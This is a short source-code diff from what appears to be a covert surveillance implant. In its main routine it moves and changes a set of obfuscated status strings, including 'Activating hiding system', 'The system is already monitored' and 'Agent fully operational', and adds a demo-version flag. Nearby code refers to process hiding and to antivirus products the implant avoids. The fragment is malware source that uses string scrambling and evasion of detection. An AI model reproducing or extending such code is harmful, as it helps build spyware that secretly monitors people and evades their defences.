@@ -2876,15 +2876,6 @@ void DeletePending()
 // Main del core
 void __stdcall HM_sMain(void)
 {
-	ScrambleString ssok("QM\r\n"); // "OK\r\n"
-	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1..........."); // "- Checking components..........."
-	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......"); // "- Activating hiding system......"
-	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n"); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
-	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1.........."); // "- Initializing modules.........."
-	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n"); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
-	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl.........."); // "- Starting core module.........."
-	ScrambleString ss7("\r\n xClPv zdWWJ E7lt8vUEP8W\r\n\r\n"); // "\r\n Agent fully operational\r\n\r\n"
-
 	pid_hide_struct pid_hide;
 
 	// Ci sono degli AV con cui proprio non si deve installare
@@ -2901,6 +2892,15 @@ void __stdcall HM_sMain(void)
 	// nella versione demo
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
+
+	ScrambleString ssok("QM\r\n", is_demo_version); // "OK\r\n"
+	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1...........", is_demo_version); // "- Checking components..........."
+	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......", is_demo_version); // "- Activating hiding system......"
+	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n", is_demo_version); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
+	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1..........", is_demo_version); // "- Initializing modules.........."
+	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n", is_demo_version); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
+	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl..........", is_demo_version); // "- Starting core module.........."
+	ScrambleString ss7("\r\n xClPv zdWWJ E7lt8vUEP8W\r\n\r\n", is_demo_version); // "\r\n Agent fully operational\r\n\r\n"
 
 	REPORT_STATUS_LOG(ss1.get_str());
 
